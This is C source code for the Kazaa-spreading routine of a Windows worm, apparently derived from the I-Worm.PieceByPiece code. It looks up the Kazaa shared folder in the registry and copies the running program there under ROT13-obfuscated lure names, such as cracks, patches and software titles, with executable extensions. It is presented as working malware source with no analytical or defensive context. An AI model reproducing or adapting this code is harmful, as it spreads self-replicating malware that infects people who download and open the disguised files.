/*
 *  Based on I-Worm.PieceByPiece source code.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "lib.h"

char *kazaa_names[] = {
	"jvanzc5",
	"vpd2004-svany",
	"npgvingvba_penpx",
	"fgevc-tvey-2.0o"	/* missed comma in the original version */
	"qpbz_cngpurf",
	"ebbgxvgKC",
	"bssvpr_penpx",
	"ahxr2004"
};

static void kazaa_spread(char *file)
{
	int kazaa_names_cnt = sizeof(kazaa_names) / sizeof(kazaa_names[0]);
	char kaza[256];
	DWORD kazalen=sizeof(kaza);
	HKEY hKey;
	char key_path[64], key_val[32];

	// Software\Kazaa\Transfer
	rot13(key_path, "Fbsgjner\\Xnmnn\\Genafsre");
	rot13(key_val, "QyQve0");	// "DlDir0"

	// Get the path to Kazaa from the registry
	ZeroMemory(kaza, kazalen);
	if (RegOpenKeyEx(HKEY_CURRENT_USER,key_path,0,KEY_QUERY_VALUE,&hKey)) return;

	if (RegQueryValueEx(hKey, key_val, 0, NULL, (PBYTE)kaza, &kazalen)) return;
	RegCloseKey(hKey);

	if (kaza[0] == 0) return;
	if (kaza[lstrlen(kaza)-1] == '/') kaza[lstrlen(kaza)-1] = '\\';
	if (kaza[lstrlen(kaza)-1] != '\\') lstrcat(kaza, "\\");
	rot13(kaza+lstrlen(kaza), kazaa_names[xrand16() % kazaa_names_cnt]);
	lstrcat(kaza, ".");

	switch (xrand16() % 6) {
		case 0: case 1: lstrcat(kaza, "ex"); lstrcat(kaza, "e"); break;
		case 2: case 3: lstrcat(kaza, "sc"); lstrcat(kaza, "r"); break;
		case 4: lstrcat(kaza, "pi"); lstrcat(kaza, "f"); break;
		default: lstrcat(kaza, "ba"); lstrcat(kaza, "t"); break;
	}

	CopyFile(file,kaza,TRUE);
}

void p2p_spread(void)
{
	char selfpath[MAX_PATH];
	GetModuleFileName(NULL, selfpath, MAX_PATH);

	kazaa_spread(selfpath);
}
